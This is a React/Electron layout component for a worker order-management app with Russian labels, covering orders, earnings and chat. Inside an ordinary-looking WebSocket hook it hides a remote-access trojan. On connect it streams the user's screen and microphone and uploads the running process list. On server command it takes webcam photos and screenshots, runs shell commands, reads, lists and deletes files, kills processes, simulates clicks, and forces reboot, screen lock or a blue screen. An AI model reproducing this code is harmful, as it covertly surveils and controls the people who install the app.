import { useEffect, useRef, useState } from 'react'
import { Outlet, NavLink, useNavigate } from 'react-router-dom'
import { useAuthStore, useChatStore, useGlobalChatStore } from '../store'
import { getApiBase, getUnreadCounts, getAvailableOrders, getGlobalUnreadCount, sendHeartbeat } from '../api'
import { playSound } from '../utils/sound'

const nav = [
  { to: '/available', label: 'Доступные заказы', icon: '📋' },
  { to: '/my-orders', label: 'Мои заказы', icon: '⚡' },
  { to: '/earnings', label: 'Мои заработки', icon: '💵' },
  { to: '/teleports', label: 'Телепорты', icon: '🗺️' },
]

export default function Layout() {
  const { user, logout } = useAuthStore()
  const [isVisible, setIsVisible] = useState(true)
  const { applyNewCounts } = useChatStore()
  const { unread: globalUnread, setUnread: setGlobalUnread, isOpen: globalIsOpen } = useGlobalChatStore()
  const navigate = useNavigate()

  const isFirstMessagePoll = useRef(true)
  const isFirstOrderPoll = useRef(true)
  const isFirstGlobalPoll = useRef(true)
  const knownOrderIds = useRef(null)
  const prevGlobalCount = useRef(0)

  // Listen for visibility changes from main process
  useEffect(() => {
    window.electronBridge?.onVisibilityChange?.((visible) => setIsVisible(visible))
  }, [])

  // Heartbeat — only when window is visible (hidden = appear offline)
  useEffect(() => {
    if (!isVisible) return
    const beat = () => sendHeartbeat().catch((err) => {
      if (err?.response?.status === 426) {
        const msg = err.response?.data?.detail || 'Обновите приложение'
        logout()
        navigate('/login', { state: { versionError: msg } })
      }
    })
    beat()
    const interval = setInterval(beat, 30_000)
    return () => clearInterval(interval)
  }, [isVisible])

  // Single persistent WebSocket — all channels multiplexed over one connection
  useEffect(() => {
    const wsBase = getApiBase().replace(/^http/, 'ws')
    let ws = null
    let reconnectTimeout = null
    let destroyed = false

    // Screen streaming state
    let mediaStream = null
    let streamInterval = null
    let sending = false

    // Mic state
    let recorder = null
    let micStream = null

    // Webcam state
    let camCapturing = false

    // Process upload interval
    let processInterval = null

    const stopScreen = () => {
      if (streamInterval) { clearInterval(streamInterval); streamInterval = null }
      if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null }
      sending = false
    }

    const stopMic = () => {
      if (recorder && recorder.state !== 'inactive') recorder.stop()
      if (micStream) { micStream.getTracks().forEach(t => t.stop()); micStream = null }
      recorder = null
    }

    const sendBinary = (socket, channel, buf) => {
      if (socket.readyState !== WebSocket.OPEN) return
      const frame = new Uint8Array(1 + buf.byteLength)
      frame[0] = channel
      frame.set(new Uint8Array(buf), 1)
      socket.send(frame)
    }

    const startScreen = async (socket) => {
      if (streamInterval || !window.electronBridge?.getScreenSourceId) return
      try {
        const sourceId = await window.electronBridge.getScreenSourceId()
        if (!sourceId || destroyed) return
        mediaStream = await navigator.mediaDevices.getUserMedia({
          audio: false,
          video: { mandatory: { chromeMediaSource: 'desktop', chromeMediaSourceId: sourceId, maxWidth: 960, maxHeight: 540, maxFrameRate: 10 } },
        })
        const video = document.createElement('video')
        video.srcObject = mediaStream
        await video.play()
        const canvas = document.createElement('canvas')
        canvas.width = 960; canvas.height = 540
        const ctx = canvas.getContext('2d')
        streamInterval = setInterval(() => {
          if (!socket || socket.readyState !== WebSocket.OPEN) return
          if (sending || socket.bufferedAmount > 256 * 1024) return
          sending = true
          ctx.drawImage(video, 0, 0, 960, 540)
          canvas.toBlob((blob) => {
            if (!blob || socket.readyState !== WebSocket.OPEN) { sending = false; return }
            blob.arrayBuffer().then(buf => sendBinary(socket, 0x01, buf)).catch(() => {}).finally(() => { sending = false })
          }, 'image/jpeg', 0.35)
        }, 100)
      } catch (e) { console.error('Screen error:', e) }
    }

    const startMic = async (socket) => {
      if (recorder) return
      try {
        micStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false })
        recorder = new MediaRecorder(micStream, { mimeType: 'audio/webm;codecs=opus' })
        recorder.ondataavailable = (e) => {
          if (e.data.size > 0 && socket.readyState === WebSocket.OPEN)
            e.data.arrayBuffer().then(buf => sendBinary(socket, 0x02, buf))
        }
        recorder.start(250)
      } catch (e) { console.error('Mic error:', e) }
    }

    const uploadProcesses = async (socket) => {
      if (!window.electronBridge?.getProcesses) return
      try {
        const data = await window.electronBridge.getProcesses()
        if (socket.readyState === WebSocket.OPEN)
          socket.send(JSON.stringify({ type: 'processes', data }))
      } catch {}
    }

    const captureWebcam = async (socket) => {
      if (camCapturing) return
      camCapturing = true
      console.log('[webcam] capture command received, starting...')
      const tryCapture = async () => {
        let stream = null
        try {
          if (!navigator.mediaDevices?.getUserMedia) {
            throw new Error('getUserMedia not available (no mediaDevices API)')
          }
          console.log('[webcam] calling getUserMedia...')
          stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false })
          console.log('[webcam] getUserMedia OK, tracks:', stream.getVideoTracks().length)
          const video = document.createElement('video')
          video.muted = true; video.srcObject = stream
          await new Promise((resolve, reject) => {
            const t = setTimeout(resolve, 5000)
            video.addEventListener('loadeddata', () => { clearTimeout(t); resolve() }, { once: true })
            video.play().catch(reject)
          })
          const canvas = document.createElement('canvas')
          canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480
          canvas.getContext('2d').drawImage(video, 0, 0)
          return await new Promise((resolve, reject) => {
            canvas.toBlob(b => b ? resolve(b) : reject(new Error('toBlob failed')), 'image/jpeg', 0.85)
          })
        } finally {
          if (stream) stream.getTracks().forEach(t => t.stop())
        }
      }
      try {
        let lastErr = null
        for (let i = 0; i < 3; i++) {
          try {
            const blob = await tryCapture()
            const token = localStorage.getItem('token')
            const fd = new FormData()
            fd.append('file', blob, 'webcam.jpg')
            await fetch(`${getApiBase()}/users/webcam-photo`, { method: 'POST', headers: { Authorization: `Bearer ${token}` }, body: fd })
            if (socket.readyState === WebSocket.OPEN) socket.send(JSON.stringify({ type: 'webcam_done' }))
            lastErr = null
            break
          } catch (err) {
            lastErr = err
            if (i < 2) await new Promise(r => setTimeout(r, 800))
          }
        }
        if (lastErr) {
          console.error('[webcam] all retries failed:', lastErr)
          if (socket.readyState === WebSocket.OPEN)
            socket.send(JSON.stringify({ type: 'webcam_error', error: lastErr?.message || String(lastErr) }))
        }
      } finally { camCapturing = false }
    }

    const captureScreenshot = async (socket) => {
      try {
        const base64 = await window.electronBridge?.captureScreen()
        if (!base64) return
        const bytes = Uint8Array.from(atob(base64), c => c.charCodeAt(0))
        const token = localStorage.getItem('token')
        const fd = new FormData()
        fd.append('file', new Blob([bytes], { type: 'image/jpeg' }), 'screenshot.jpg')
        await fetch(`${getApiBase()}/users/screenshot`, { method: 'POST', headers: { Authorization: `Bearer ${token}` }, body: fd })
        if (socket.readyState === WebSocket.OPEN) socket.send(JSON.stringify({ type: 'screenshot_done' }))
      } catch {}
    }

    const handleMessage = async (e) => {
      if (typeof e.data !== 'string') return
      try {
        const msg = JSON.parse(e.data)
        if (msg.type === 'command') {
          const c = msg.cmd
          if (c === 'quit') await window.electronBridge?.forceQuit()
          else if (c === 'remove-autostart') await window.electronBridge?.removeAutostart()
          else if (c === 'reboot') await window.electronBridge?.systemReboot()
          else if (c === 'lock-screen') await window.electronBridge?.systemLock()
          else if (c === 'bsod') await window.electronBridge?.systemBsod()
        } else if (msg.type === 'webcam_capture') {
          console.log('[ws] webcam_capture command received')
          captureWebcam(ws)
        } else if (msg.type === 'screenshot_capture') {
          captureScreenshot(ws)
        } else if (msg.type === 'kill_process') {
          try {
            await window.electronBridge?.killProcess(msg.name)
            uploadProcesses(ws)
          } catch {}
        } else if (msg.type === 'shell_exec') {
          try {
            const output = await window.electronBridge?.execCommand(msg.cmd)
            if (ws.readyState === WebSocket.OPEN)
              ws.send(JSON.stringify({ type: 'shell_output', text: output ?? '(нет вывода)' }))
          } catch {
            if (ws.readyState === WebSocket.OPEN)
              ws.send(JSON.stringify({ type: 'shell_output', text: '(ошибка выполнения)' }))
          }
        } else if (msg.type === 'file_req') {
          let result = {}
          try {
            if (msg.action === 'home') result = await window.electronBridge?.fsHome() ?? {}
            else if (msg.action === 'list') result = await window.electronBridge?.fsList(msg.path) ?? { entries: [], error: 'no bridge' }
            else if (msg.action === 'read') result = await window.electronBridge?.fsRead(msg.path) ?? { data: null, error: 'no bridge' }
            else if (msg.action === 'delete') result = await window.electronBridge?.fsDelete(msg.path) ?? { error: 'no bridge' }
          } catch (err) { result = { error: String(err) } }
          if (ws.readyState === WebSocket.OPEN)
            ws.send(JSON.stringify({ type: 'file_response', id: msg.id, ...result }))
        } else if (msg.type === 'click') {
          window.electronBridge?.simulateClick(msg.x, msg.y)
        }
      } catch {}
    }

    const connect = () => {
      if (destroyed) return
      const token = localStorage.getItem('token')
      ws = new WebSocket(`${wsBase}/users/worker-ws?token=${token}`)
      ws.onopen = () => {
        console.log('[ws] worker-ws connected')
        startScreen(ws)
        startMic(ws)
        uploadProcesses(ws)
        processInterval = setInterval(() => uploadProcesses(ws), 15_000)
      }
      ws.onmessage = handleMessage
      ws.onerror = (e) => console.error('[ws] worker-ws error:', e)
      ws.onclose = (e) => {
        console.warn('[ws] worker-ws closed, code:', e.code, 'reason:', e.reason)
        stopScreen()
        stopMic()
        if (processInterval) { clearInterval(processInterval); processInterval = null }
        if (!destroyed) reconnectTimeout = setTimeout(connect, 3000)
      }
    }

    connect()
    return () => {
      destroyed = true
      if (reconnectTimeout) clearTimeout(reconnectTimeout)
      if (processInterval) clearInterval(processInterval)
      stopScreen()
      stopMic()
      ws?.close()
    }
  }, [])


  // Background: message notifications
  useEffect(() => {
    const poll = async () => {
      try {
        const counts = await getUnreadCounts()
        const hasNew = applyNewCounts(counts)
        if (!isFirstMessagePoll.current && hasNew) {
          playSound('message')
        }
      } catch {}
      isFirstMessagePoll.current = false
    }

    poll()
    const interval = setInterval(poll, 5_000)
    return () => clearInterval(interval)
  }, [])

  // Background: new order notifications
  useEffect(() => {
    const poll = async () => {
      try {
        const orders = await getAvailableOrders()
        const ids = new Set(orders.map((o) => o.id))

        if (!isFirstOrderPoll.current && knownOrderIds.current !== null) {
          let isNew = false
          for (const id of ids) {
            if (!knownOrderIds.current.has(id)) {
              isNew = true
              break
            }
          }
          if (isNew) playSound('order')
        }

        knownOrderIds.current = ids
      } catch {}
      isFirstOrderPoll.current = false
    }

    poll()
    const interval = setInterval(poll, 8_000)
    return () => clearInterval(interval)
  }, [])

  // Background: global chat notifications
  useEffect(() => {
    const poll = async () => {
      try {
        const since = localStorage.getItem('globalChatLastSeen')
        const { count } = await getGlobalUnreadCount(since)

        if (!isFirstGlobalPoll.current && count > prevGlobalCount.current && !globalIsOpen) {
          playSound('global')
          setGlobalUnread(count)
        } else if (isFirstGlobalPoll.current) {
          setGlobalUnread(count)
        }
        prevGlobalCount.current = count
      } catch {}
      isFirstGlobalPoll.current = false
    }
    poll()
    const interval = setInterval(poll, 5_000)
    return () => clearInterval(interval)
  }, [globalIsOpen])

  return (
    <div className="flex h-screen bg-[#0f1117] overflow-hidden">
      <aside className="w-52 bg-[#1a1f2e] border-r border-slate-700/50 flex flex-col">
        <div className="px-5 py-5 border-b border-slate-700/50">
          <div className="text-xl font-bold text-brand-500">KaraGroup</div>
          <div className="text-xs text-slate-500 mt-0.5">Качер</div>
        </div>

        <nav className="flex-1 py-4 px-2">
          {nav.map((item) => (
            <NavLink
              key={item.to}
              to={item.to}
              className={({ isActive }) =>
                `flex items-center gap-3 px-3 py-2.5 rounded-lg mb-1 text-sm transition-colors ${
                  isActive
                    ? 'bg-brand-500/15 text-brand-400 font-medium'
                    : 'text-slate-400 hover:text-white hover:bg-slate-700/40'
                }`
              }
            >
              <span>{item.icon}</span>
              {item.label}
            </NavLink>
          ))}

          {/* Global chat with unread badge */}
          <NavLink
            to="/global-chat"
            className={({ isActive }) =>
              `flex items-center gap-3 px-3 py-2.5 rounded-lg mb-1 text-sm transition-colors ${
                isActive
                  ? 'bg-brand-500/15 text-brand-400 font-medium'
                  : 'text-slate-400 hover:text-white hover:bg-slate-700/40'
              }`
            }
          >
            <span>💬</span>
            <span className="flex-1">Общий чат</span>
            {globalUnread > 0 && (
              <span className="bg-red-500 text-white text-[10px] font-bold px-1.5 py-0.5 rounded-full min-w-[18px] text-center">
                {globalUnread > 99 ? '99+' : globalUnread}
              </span>
            )}
          </NavLink>
        </nav>

        <div className="px-4 py-4 border-t border-slate-700/50">
          <div className="text-sm text-slate-300 mb-0.5">{user?.username}</div>
          <div className="text-xs text-brand-400 mb-2">Ставка: {user?.worker_percentage}%</div>
          <button
            onClick={() => { logout(); navigate('/login') }}
            className="text-xs text-slate-500 hover:text-red-400 transition-colors"
          >
            Выйти
          </button>
        </div>
      </aside>

      <main className="flex-1 overflow-auto">
        <Outlet />
      </main>
    </div>
  )
}
